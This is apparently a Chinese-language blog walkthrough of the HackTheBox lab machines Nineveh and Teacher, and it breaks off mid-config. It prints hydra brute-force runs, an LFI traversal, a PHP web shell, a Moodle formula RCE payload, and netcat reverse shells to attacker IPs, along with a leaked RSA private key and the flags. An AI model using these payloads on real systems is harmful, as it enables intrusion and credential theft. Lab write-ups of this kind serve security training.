scan report for 10.10.10.43 Host is up (0.35s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | tls-alpn: |_ http/1.1 |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR | Not valid before: 2017-07-01T15:03:30 |_Not valid after: 2018-07-01T15:03:30 |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 4.2 (91%), Linux 4.4 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 345.03 ms 10.10.14.1 2 343.72 ms 10.10.10.43 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.37 seconds Http Https http 和 https 都没有什么可用的东西，进行 fuzz 看一下 Fuzz┌──(root㉿lucifiel)-[~/Desktop] └─# ffuf -u &#39;http://10.10.10.43/FUZZ&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.43/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ server-status [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 341ms] [Status: 200, Size: 178, Words: 22, Lines: 6, Duration: 345ms] department [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 342ms] :: Progress: [30000/30000] :: Job [1/1] :: 289 req/sec :: Duration: [0:02:52] :: Errors: 59 :: ┌──(root㉿lucifiel)-[~/Desktop] └─# ffuf -u &#39;https://10.10.10.43/FUZZ&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : https://10.10.10.43/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ db [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 1489ms] server-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 351ms] [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 378ms] :: Progress: [30000/30000] :: Job [1/1] :: 134 req/sec :: Duration: [0:05:04] :: Errors: 38 :: 首先看一下 http 的内容 这边有个登录口，可以对账号进行遍历，得到了一个账号 admin，对密码进行一下尝试爆破 ┌──(root㉿lucifiel)-[~/Desktop] └─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V -f http-post-form &#39;/department/login.php:username=^USER^&amp;password=^PASS^:invalid password&#39; Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 14:11:26 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&amp;password=^PASS^:invalid password [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t [STATUS] attack finished for 10.10.10.43 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 14:38:57 成功拿到一个账号密码 username = admin password = 1q2w3e4r5t 成功登入后台 漏洞利用Have you fixed the login page yet! hardcoded username and password is really bad idea! check your serect folder to get in! figure it out! this is your challenge Improve the db interface. ~amrois 在 notes 中发现了一个提示 这边的域名很有趣，http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt 我猜测应该是具有 LFI 的，尝试进行利用 http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd 成功绕过获得一个 LFI 漏洞 http://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../etc/passwd 对 poc 长度进行了一下简化 这边找到一个 phpinfo 页面 http://10.10.10.43/info.php 暂时没什么思路进行破解，看看 https 的内容吧 这边还是需要爆破 ┌──(root㉿lucifiel)-[~/Desktop] └─# hydra 10.10.10.43 -l admin -P /usr/share/wordlists/rockyou.txt -V -f https-post-form &#39;/db/index.php:password=^PASS^&amp;remember=yes&amp;logn=Log+In&amp;proc_login=true:Incorrect password&#39; Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-07 15:05:26 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&amp;remember=yes&amp;logn=Log+In&amp;proc_login=true:Incorrect password [443][http-post-form] host: 10.10.10.43 login: admin password: password123 [STATUS] attack finished for 10.10.10.43 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-07 15:34:26 获得了一个密码 password123 成功进入管理面板 https://www.exploit-db.com/exploits/24044 根据面板的版本，找到了一个远程 PHP 代码注入 新建一个文章 &lt;?php echo system($_REQUEST[&quot;cmd&quot;]);?&gt; 然后写入一句话木马 接着修改一下加载的库 成功执行命令，然后使用 nc 监听一个端口，接着构造一个反弹 shell 的 poc http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&amp;cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.19+4444+%3E/tmp/f ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57110 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; www-data@nineveh:/var/www/html/department$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功得到一个 shel 权限提升Userwww-data@nineveh:/var/www/ssl/secure_notes$ ls ls index.html nineveh.png www-data@nineveh:/var/www/ssl/secure_notes$ file nineveh.png file nineveh.png nineveh.png: PNG image data, 1497 x 746, 8-bit/color RGB, non-interlaced 在 &#x2F;var&#x2F;www&#x2F;ssl&#x2F;secure_notes 目录中找到了一个名为 nineveh.png 的图片，去访问一下看看 https://10.10.10.43/secure_notes&#x2F;nineveh.png 在这显示个这个，肯定不太对劲，估计是有文件隐写，查看一下 www-data@nineveh:/var/www/ssl/secure_notes$ strings nineveh.png strings nineveh.png -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5 FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI 3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo 9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl 1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89 P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1 MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7 fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG -----END RSA PRIVATE KEY----- secret/nineveh.pub 0000644 0000041 0000041 00000000620 13126060277 014541 ustar www-data www-data ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb 找到了一串 sshkey www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/passwd |grep bash cat /etc/passwd |grep bash root:x:0:0:root:/root:/bin/bash amrois:x:1000:1000:,,,:/home/amrois:/bin/bash 找到了我们可以登陆的账户 amrois 然后把 sshkey 保存为 id_rsa 给予 600 权限 chmod 600 id_rsa 测试后发现 22 端口没有打开，我们还得想办法打开 22 端口 www-data@nineveh:/var/www/html/department$ cat /etc/knockd.conf cat /etc/knockd.conf [options] logfile = /var/log/knockd.log interface = ens160 [openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 找到了一个文件，查看了一下，百度了一下，应该是一个端口敲门 https://lingwu111.github.io/端口敲门技术.html 找到了一篇文章，讲解了端口敲门的原理 简单的说，就是我们得依次访问 571、290、911 这三个端口，然后达成一个叩叩叩敲门的效果，然后防火墙就会来开门，把 22 端口向我们开放 for x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done 编写好相关语句，去开始敲门吧 ┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -p22 10.10.10.43 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Nmap scan report for 10.10.10.43 Host is up (0.42s latency). PORT STATE SERVICE 22/tcp filtered ssh Nmap done: 1 IP address (1 host up) scanned in 4.79 seconds ┌──(root㉿lucifiel)-[~/Desktop] └─# for x in 571 290 911 ; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 571/tcp filtered umeter Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 290/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 911/tcp filtered xact-backup Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds ┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -p22 10.10.10.43 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 12:20 CST Nmap scan report for 10.10.10.43 Host is up (0.38s latency). PORT STATE SERVICE 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds 成功敲开 22 端口 去连接 ssh ┌──(root㉿lucifiel)-[~/Desktop] └─# ssh amrois@10.10.10.43 -i id_rsa The authenticity of host &#39;10.10.10.43 (10.10.10.43)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.43&#39; (ED25519) to the list of known hosts. Ubuntu 16.04.2 LTS Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 288 packages can be updated. 207 updates are security updates. You have mail. Last login: Mon Jul 3 00:19:59 2017 from 192.168.0.14 amrois@nineveh:~$ whoami&amp;&amp;id amrois uid=1000(amrois) gid=1000(amrois) groups=1000(amrois) 成功提权到 user 权限 amrois@nineveh:~$ ls user.txt amrois@nineveh:~$ cat user.txt e451f28264547fd414a407d0c8fccb78 成功拿到 user 权限的 flag 文件 Root首先跑一个 linpeas.sh ╔══════════╣ SGID ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid -rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 35K Mar 16 2016 /sbin/unix_chkpwd -rwxr-sr-x 1 root utmp 10K Mar 11 2016 /usr/lib/x86_64-linux-gnu/utempter/utempter -rwxr-sr-x 1 root tty 15K Mar 1 2016 /usr/bin/bsd-write -rwxr-sr-x 1 root utmp 425K Feb 7 2016 /usr/bin/screen ---&gt; GNU_Screen_4.5.0 -rwxr-sr-x 1 root shadow 61K Mar 29 2016 /usr/bin/chage -rwxr-sr-x 1 root mlocate 39K Nov 18 2014 /usr/bin/mlocate -rwxr-sr-x 1 root ssh 351K Mar 16 2017 /usr/bin/ssh-agent -rwxr-sr-x 1 root crontab 36K Apr 5 2016 /usr/bin/crontab -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at ---&gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwxr-sr-x 1 root shadow 23K Mar 29 2016 /usr/bin/expiry -rwxr-sr-x 1 root tty 27K Dec 16 2016 /usr/bin/wall 这边是看到有权限对 crontab 进行执行的，去查看一下 amrois@nineveh:~$ crontab -l # Edit this file to introduce tasks to be run by cron. # # Each task to run has to be defined through a single line # indicating with different fields when the task will be run # and what command to run for the task # # To define the time you can provide concrete values for # minute (m), hour (h), day of month (dom), month (mon), # and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# # Notice that tasks will be started based on the cron&#39;s system # daemon&#39;s notion of time and timezones. # # Output of the crontab jobs (including errors) is sent through # email to the user the crontab file belongs to (unless redirected). # # For example, you can run a backup of all your user accounts # at 5 a.m every week with: # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ # # For more information see the manual pages of crontab(5) and cron(8) # # m h dom mon dow command */10 * * * * /usr/sbin/report-reset.sh 找到了一个脚本 amrois@nineveh:~$ cat /usr/sbin/report-reset.sh #!/bin/bash rm -rf /report/*.txt amrois@nineveh:~$ ls -la /report/ total 24 drwxr-xr-x 2 amrois amrois 4096 Jul 8 00:21 . drwxr-xr-x 24 root root 4096 Jan 29 2021 .. -rw-r--r-- 1 amrois amrois 4815 Jul 8 00:20 report-22-07-08:00:20.txt -rw-r--r-- 1 amrois amrois 4815 Jul 8 00:21 report-22-07-08:00:21.txt 不太了解是什么，去看下查询一下 在查询以及跑了一个 pspy 后，得到了一个一直持续运行着的文件 &#x2F;usr&#x2F;bin&#x2F;chkrootkit https://www.exploit-db.com/exploits/33899 经过查找后，找到了这么一个漏洞 然后在 &#x2F;tmp 下创建一个名为 update 的文件，写入如下内容 #!/bin/bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 4444 &gt;/tmp/f 给 update 一个执行权限 chmod +x /tmp/update 然后使用 nc 开启一个端口监听 等待 shell 回来就可以了 ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 57140 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 # cat /root/root.txt a35547e94d50dd524433ee8e427733ea 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Teacher - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Teacher","date":"2022-06-30T11:38:36.000Z","updated":"2023-06-13T03:53:24.000Z","comments":true,"path":"2022/06/30/Hackthebox/Easy/Hackthebox-Teacher/","link":"","permalink":"http://www.lucifiel.com/2022/06/30/Hackthebox/Easy/Hackthebox-Teacher/","excerpt":"","text":"Hackthebox - Teacher靶场信息 靶场类型 信息收集Nmap┌──(root💀lucifiel)-[~] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.153 Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-30 09:20 CST Nmap scan report for 10.10.10.153 Host is up (0.17s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/30%OT=80%CT=1%CU=36344%PV=Y%DS=2%DC=T%G=Y%TM=62BCFA9 OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1 OS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 170.79 ms 10.10.14.1 2 171.01 ms 10.10.10.153 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.07 seconds Http Fuzz┌──(root㉿lucifiel)-[~/Desktop] └─# ffuf -u &#39;http://10.10.10.153/FUZZ&#39; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.153/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ fonts [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 342ms] phpmyadmin [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 339ms] manual [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 355ms] images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 5521ms] css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 5521ms] javascript [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5542ms] js [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 6427ms] moodle [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 340ms] server-status [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 345ms] [Status: 200, Size: 8028, Words: 514, Lines: 250, Duration: 1349ms] :: Progress: [30000/30000] :: Job [1/1] :: 161 req/sec :: Duration: [0:02:01] :: Errors: 96 :: 挨个访问后发现 phpmyadmin 无权限访问，manual 得到了一个信息，该靶机使用的中间件是 Apache HTTP Server Version 2.4。访问 moodle 目录会跳转到 http://teacher.htb/moodle，我们去加一个hosts echo 10.10.10.153 teacher.htb &gt;&gt; /etc/hosts 这边拿到了一个账号，但是没有密码，去看看其他思路。 这张图片一看就有点不对，我们去访问一下看看 文件损坏？下载下来看看 ┌──(root㉿lucifiel)-[~/Desktop] └─# wget http://teacher.htb/images/5.png --2022-06-30 10:42:06-- http://teacher.htb/images/5.png 正在解析主机 teacher.htb (teacher.htb)... 10.10.10.153 正在连接 teacher.htb (teacher.htb)|10.10.10.153|:80... 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：200 [image/png] 正在保存至: “5.png” 5.png 100%[========================================================================================================================================&gt;] 200 --.-KB/s 用时 0s 2022-06-30 10:42:07 (14.1 MB/s) - 已保存 “5.png” [200/200]) ┌──(root㉿lucifiel)-[~/Desktop] └─# ls 5.png ┌──(root㉿lucifiel)-[~/Desktop] └─# file 5.png 5.png: ASCII text 这是一个 text 文本文件，读取一下内容 ┌──(root㉿lucifiel)-[~/Desktop] └─# cat 5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni 得到了一个账号密码，但密码的最后一位不确定 username = Giovanni password = Th4C00lTheacha? 我们去爆破一下最后一位密码 漏洞利用首先使用现有的密码去生成一个密码字典 Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 然后去爆破一下 这边 Th4C00lTheacha# 的结果不一样，就是正确密码了，我们得到了一个账号密码 username = Giovanni password = Th4C00lTheacha# 这边针对 moodle 找到了一篇漏洞的参考文章 https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips 首先，我们将进入Algebra课程 然后打开编辑 然后随便选一个点击 Add an activity or resource 进行添加 然后选择 Quiz 这里随便填，然后save and display 接着 edit quiz 然后 a new question 新增一个新问题 然后选择calculated 上面随便填写，answer 1 formalu 输入我们的payload，然后grade选择100%就行 /*{a*/`$_GET[0]`;//{x}} 然后 save change http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;appendqnumstring=addquestion&amp;scrollpos=0&amp;id=6&amp;wizardnow=datasetitems&amp;cmid=7 点击 next page 进入页面，得到了上面的地址 然后使用 nc 开启一个端口监听 &amp;0=(nc -e /bin/bash 10.10.14.2 4444) 最后将我们的 shell 反弹语句添加到url的最后面 ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 56932 whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; www-data@teacher:/var/www/html/moodle/question$ 成功获取到一个 shell www-data@teacher:/var/www/html/moodle/question$ cd /home cd /home www-data@teacher:/home$ ls ls giovanni www-data@teacher:/home$ cd giovanni cd giovanni bash: cd: giovanni: Permission denied 我们没有权限访问用户目录 权限提升User这边用的是 moodle 的 cms，而在之前 fuzz 的时候有看到一个 phpmyadmin，所以我猜测是和数据库有关。 既然和数据库有关，又是 cms，那么很可能配置文件中有数据的账号密码，去找一下 www-data@teacher:/var/www/html/moodle$ ls ls CONTRIBUTING.txt config-dist.php.bak message COPYING.txt config.php mnet Gruntfile.js config.php.save mod INSTALL.txt course my PULL_REQUEST_TEMPLATE.txt dataformat notes README.txt draftfile.php npm-shrinkwrap.json TRADEMARK.txt enrol package.json admin error phpunit.xml.dist analytics file.php pix auth files plagiarism availability filter pluginfile.php backup githash.php portfolio badges grade question behat.yml.dist group rating blocks help.php report blog help_ajax.php repository brokenfile.php index.php rss cache install search calendar install.php tag cohort iplookup theme comment lang user competency lib userpix completion local version.php composer.json login webservice composer.lock media www-data@teacher:/var/www/html/moodle$ cat config.php cat config.php &lt;?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-&gt;dbtype = &#39;mariadb&#39;; $CFG-&gt;dblibrary = &#39;native&#39;; $CFG-&gt;dbhost = &#39;localhost&#39;; $CFG-&gt;dbname = &#39;moodle&#39;; 